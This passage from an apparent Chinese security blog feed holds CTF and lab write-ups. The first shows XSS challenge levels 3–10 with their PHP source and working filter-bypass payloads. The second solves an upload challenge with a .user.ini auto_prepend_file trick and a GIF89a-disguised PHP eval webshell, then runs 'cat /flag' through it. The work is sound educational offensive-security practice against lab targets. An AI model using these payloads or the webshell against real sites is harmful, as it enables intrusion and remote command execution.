class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level3&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">"&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value='"</span>.htmlspecialchars($str).<span class="string">"'&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level3.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li><p><strong>分析：</strong></p></li><li><p>一共有两处转义：</p><ul><li>第一处转义，输入被转义为html实体，不能直接执行；</li><li>第二处转义，输入被转义为html实体，不能直接执行，也不能闭合双引号。但是单引号没被转义。</li><li>所以可以用单引号闭合input标签，使用不包含被转义特殊字符的弹框方式。</li></ul></li><li><p><strong>Payload：</strong></p><ul><li>上述两事件的alert前可以不加javascript</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;onclick&#x3D;&#39;alert(&#x2F;xss&#x2F;)      #标准格式：onclick&#x3D;&#39;alert(&#x2F;xss&#x2F;)&#39;，点击输入框触发</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;onmouseover&#x3D;&#39;alert(&#x2F;xss&#x2F;) #标准格式：onmouseover&#x3D;&#39;alert(&#x2F;xss&#x2F;)&#39; ，鼠标移动到输入框触发</span><br></pre></td></tr></table></figure><h1 id="level-4"><a class="markdownIt-Anchor" href="#level-4"></a> Level 4</h1><ul><li><strong>后台源码：</strong></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"content-type"</span> content=<span class="string">"text/html;charset=utf-8"</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line">confirm(<span class="string">"完成的不错！"</span>);</span><br><span class="line"> window.location.href=<span class="string">"level5.php?keyword=find a way out!"</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level4&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level4&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str2=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level4.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str3).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li><p><strong>分析：</strong><br />将用户输入个keyword中的&lt;和&gt;替换为空，但在input标签内并未转义。所以直接闭合input标签中的value（不能闭合整个input标签）并使用不带尖括号但弹框方式即可。</p></li><li><p><strong>Payload：</strong></p></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;onclick&#x3D;&#39;alert(&#x2F;xss&#x2F;)&#39;</span><br></pre></td></tr></table></figure><h1 id="level-5"><a class="markdownIt-Anchor" href="#level-5"></a> Level 5</h1><ul><li><strong>后台源码：</strong></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"content-type"</span> content=<span class="string">"text/html;charset=utf-8"</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line">confirm(<span class="string">"完成的不错！"</span>);</span><br><span class="line"> window.location.href=<span class="string">"level6.php?keyword=break it out!"</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level5&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level5&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level5.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str3).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li><p><strong>分析：</strong></p><ul><li>对&lt;script和on关键字进行了过滤</li><li>第二次引用keyword时没有转义，可以闭合input标签；然后采用不含&lt;script和on的弹框方式</li></ul></li><li><p><strong>Payload：</strong></p></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt; &lt;a href&#x3D;&#39;javascript:alert(1)&#39;&gt;  # &lt;a&gt;标签内的alert必须加javascript，伪协议</span><br></pre></td></tr></table></figure><h1 id="level-6"><a class="markdownIt-Anchor" href="#level-6"></a> Level 6</h1><ul><li><strong>后台源码：</strong></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"content-type"</span> content=<span class="string">"text/html;charset=utf-8"</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line">confirm(<span class="string">"完成的不错！"</span>);</span><br><span class="line"> window.location.href=<span class="string">"level7.php?keyword=move up!"</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level6&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level6&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level6.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str6).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li><strong>分析：</strong><ul><li>过滤了&lt;script、on、src、data、href标签</li><li>但是替换之前没有转化为小写字母，所以可以用大小写绕过</li></ul></li><li><strong>Payload：</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;img Src&#x3D;&quot;1.jpg&quot; Onerror&#x3D;&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure><h1 id="level-7"><a class="markdownIt-Anchor" href="#level-7"></a> Level 7</h1><ul><li><strong>后台源码：</strong></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"content-type"</span> content=<span class="string">"text/html;charset=utf-8"</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line">confirm(<span class="string">"完成的不错！"</span>);</span><br><span class="line"> window.location.href=<span class="string">"level8.php?keyword=nice try!"</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level7&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level7&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str =strtolower( $_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">""</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">""</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">""</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">""</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">""</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level7.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str6).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li><strong>分析：</strong><ul><li>过滤了script、on、src、data、href，并且在过滤前将keyword转换为了小写</li><li>第二处引用keyword没有编码，可以闭合input标签后，重写关键字绕过过滤</li></ul></li><li><strong>Payload：</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;scrscriptipt&gt;alert(1)&lt;&#x2F;scrscriptipt&gt;</span><br></pre></td></tr></table></figure><h1 id="level-8"><a class="markdownIt-Anchor" href="#level-8"></a> Level 8</h1><ul><li><strong>后台源码：</strong></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"content-type"</span> content=<span class="string">"text/html;charset=utf-8"</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line">confirm(<span class="string">"完成的不错！"</span>);</span><br><span class="line"> window.location.href=<span class="string">"level9.php?keyword=not bad!"</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level8&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level8&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str7).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li><p><strong>分析：</strong></p><ul><li>在过滤前将keyword转化为小写，并且过滤了script、on、src、data、href、双引号</li><li>第一次引用keyword时，采用了htmlspecialchars</li><li>第二次引用keyword时，是在a标签中，而且没有用htmlspecialchars编码</li><li>考虑编码绕过：hackbar的XSS HTML Characters编码，可将所有字符（不同于htmlspecialchars仅将特殊字符编码）编码为HTML实体，从而绕过过滤。</li><li>然后构造弹框语句，注意到编码绕过后，在第二次引用keyword时，虽然没有htmlspecialchars编码，但是我们事先已经自己将提交的keyword编码为html实体了，所以此时输入的标签不会被执行，而是被当作普通字符串，所以只能构造href超链接，而不能闭合a标签。</li></ul></li><li><p><strong>Payload：</strong></p></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javascrip&amp;#116;:alert(1)#对script进行编码（仅编码t即可）</span><br></pre></td></tr></table></figure><h1 id="level-9"><a class="markdownIt-Anchor" href="#level-9"></a> Level 9</h1><ul><li><strong>后台源码：</strong></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"content-type"</span> content=<span class="string">"text/html;charset=utf-8"</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line">confirm(<span class="string">"完成的不错！"</span>);</span><br><span class="line"> window.location.href=<span class="string">"level10.php?keyword=well done!"</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level9&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level9&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">false</span>===strpos($str7,<span class="string">'http://'</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="您的链接不合法？有没有！"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str7).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li><p><strong>分析：</strong></p><ul><li>在过滤前将keyword转化为小写，并且过滤了script、on、src、data、href、双引号</li><li>规定在输入中必须包含http://</li></ul></li><li><p><strong>Payload：</strong></p></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javascrip$#116;:alert(1)&#x2F;&#x2F;http:&#x2F;&#x2F;www.baidu.com#对script进行编码（仅编码t即可）</span><br></pre></td></tr></table></figure><h1 id="level-10"><a class="markdownIt-Anchor" href="#level-10"></a> Level 10</h1><ul><li><strong>后台源码：</strong></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"content-type"</span> content=<span class="string">"text/html;charset=utf-8"</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line">confirm(<span class="string">"完成的不错！"</span>);</span><br><span class="line"> window.location.href=<span class="string">"level11.php?keyword=good job!"</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level10&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level10&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str11 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li><p><strong>分析：</strong></p><ul><li>页面中没有任何可以点击对元素，审查元素发现，除了URL中的keyword参数之外，还有三个隐藏的input参数：t_link、t_history、t_sort</li><li>分别对这四个参数进行GET传参： <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;level10.php?keyword&#x3D;test&amp;t_link&#x3D;test1&amp;t_history&#x3D;test2&amp;t_sort&#x3D;test3</span><br></pre></td></tr></table></figure></li><li>查看页面源代码发现，t_sort被写入到html页面；通过源代码可知，keyword进行了编码，而t_sort过滤了尖括号，并没有进行编码</li><li>所以我们可以使用双引号仅闭合input标签中对value，然后添加属性是input显现在页面中</li></ul></li><li><p><strong>Payload：</strong></p></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?t_sort&#x3D;&quot;type&#x3D;&quot;text&quot; onmouseover&#x3D;&quot;alert(1)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF_Checkin</title>
      <link href="/2020/02/21/SUCTF-Checkin/"/>
      <url>/2020/02/21/SUCTF-Checkin/</url>
      
        <content type="html"><![CDATA[<h1 id="1-测试"><a class="markdownIt-Anchor" href="#1-测试"></a> 1 测试</h1><p>测试后一共有三种回显结果：</p><ul><li><kbd>&lt;? in contents!</kbd>表示 &lt;?不能连续出现在文件中</li><li><kbd>illegal suffix!</kbd>表示 不能上传后缀为php、php4、php5、phtml等可直接被解析的PHP文件</li><li><kbd>exif_imagetype:not image</kbd>表示判断一个图片的类型（即读取一个图像的第一个字节并检查其签名）</li></ul><h1 id="2-解题思路"><a class="markdownIt-Anchor" href="#2-解题思路"></a> 2 解题思路</h1><ul><li>先上传一个.user.ini文件，<strong>.user.ini会将图片马中的代码包含到每个php文件中</strong></li><li>再上传一个图片文件（图片中是php一句话木马）</li></ul><h2 id="21-attention"><a class="markdownIt-Anchor" href="#21-attention"></a> 2.1 Attention</h2><ul><li>图片马可以是GET或者POST类型；GET类型直接在URL中传参，POST类型用剑蚁连接即可</li><li>图片马的文件名要和.user.ini包含的文件名一致</li></ul><h2 id="22-上传文件的内容如下"><a class="markdownIt-Anchor" href="#22-上传文件的内容如下"></a> 2.2 上传文件的内容如下</h2><ul><li>使用GIF89a绕过exif_imagetype判断</li><li>使用&lt;script&gt;标签绕过对&lt;?的检测</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># .user.ini文件内容如下</span><br><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;123.jpg</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 123.jpg文件内容如下</span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;php&gt;eval($_GET[&#39;cc123&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h1 id="3-解题结果"><a class="markdownIt-Anchor" href="#3-解题结果"></a> 3 解题结果</h1><ul><li>上传两个文件之后回显文件上传路径<br /><img src="https://img-blog.csdnimg.cn/2019102520042654.png" alt="" /></li><li>这里我们采用GET方式连接，构造URL，注意要在存储路径后面加index.php：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:39001&#x2F;uploads&#x2F;5b02a1fb5a263b1ba6b075868c2849fa&#x2F;index.php?cc123&#x3D;system(&quot;cat &#x2F;flag&quot;);</span><br></pre></td></tr></table></figure><ul><li>拿到flag：<br /><img src="https://img-blog.csdnimg.cn/20191025200702899.png" alt="" 